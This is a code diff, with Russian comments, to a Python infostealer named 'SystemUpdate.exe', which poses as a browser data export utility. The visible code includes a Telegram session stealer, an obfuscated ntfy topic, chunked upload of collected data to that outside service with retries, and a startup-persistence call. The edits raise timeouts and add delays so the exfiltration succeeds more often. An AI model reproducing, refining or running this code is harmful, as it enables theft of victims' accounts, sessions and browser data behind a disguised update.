@@ -1,7 +1,5 @@
 # SystemUpdate.exe - Advanced Browser Data Export Utility
-# Зашифрованный топик ntfy, аккуратный вывод по категориям.
-# Если ничего не собрано – отправляет "No data collected".
-# История браузера НЕ собирается.
+# v2.1 – увеличен таймаут, добавлены задержки между запросами
 import os, json, base64, sqlite3, shutil, subprocess, re, time, socket, platform, sys
 from datetime import datetime
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -17,6 +15,8 @@ OUTPUT = os.path.join(TEMP, "SystemReport")
 os.makedirs(OUTPUT, exist_ok=True)
 RETRY_FILE = os.path.join(OUTPUT, "retry.json")
 CHUNK_SIZE = 3500
+REQUEST_TIMEOUT = 30        # было 10
+SLEEP_BETWEEN_CHUNKS = 3    # секунд
 
 # ===================== РАСШИФРОВКА ТОПИКА =====================
 def xor(data, key):
@@ -281,7 +281,7 @@ def steal_telegram_session():
 # ===================== СИСТЕМНАЯ ИНФОРМАЦИЯ =====================
 def get_external_ip():
     try:
-        return requests.get("https://api.ipify.org", timeout=5).text
+        return requests.get("https://api.ipify.org", timeout=10).text
     except:
         return socket.gethostbyname(socket.gethostname())
 
@@ -327,11 +327,12 @@ def send_to_ntfy(title, lines):
                                       "Title": f"{title} ({len(chunk)} bytes)",
                                       "Tags": "computer"
                                   },
-                                  timeout=10)
+                                  timeout=REQUEST_TIMEOUT)
             if resp.status_code != 200:
                 retry_data.append({"title": title, "data": chunk})
         except:
             retry_data.append({"title": title, "data": chunk})
+        time.sleep(SLEEP_BETWEEN_CHUNKS)      # <-- пауза между чанками
     if retry_data:
         with open(RETRY_FILE, 'w', encoding='utf-8') as f:
             json.dump(retry_data, f)
@@ -349,9 +350,10 @@ def flush_retry():
             requests.post(NTFY_URL,
                           data=e['data'].encode('utf-8'),
                           headers={"Title": "[RETRY] " + e['title']},
-                          timeout=10)
+                          timeout=REQUEST_TIMEOUT)
         except:
             remaining.append(e)
+        time.sleep(SLEEP_BETWEEN_CHUNKS)      # <-- пауза при повторной отправке
     if remaining:
         with open(RETRY_FILE, 'w', encoding='utf-8') as f:
             json.dump(remaining, f)
@@ -443,12 +445,12 @@ def main():
         requests.post(NTFY_URL,
                       data="No data collected".encode(),
                       headers={"Title": "Export Failed", "Tags": "warning"},
-                      timeout=10)
+                      timeout=REQUEST_TIMEOUT)
     else:
         requests.post(NTFY_URL,
                       data=f"Export complete at {datetime.now()}",
                       headers={"Title": "Export Done", "Tags": "white_check_mark"},
-                      timeout=10)
+                      timeout=REQUEST_TIMEOUT)
 
     # Автозагрузка
     add_to_startup()
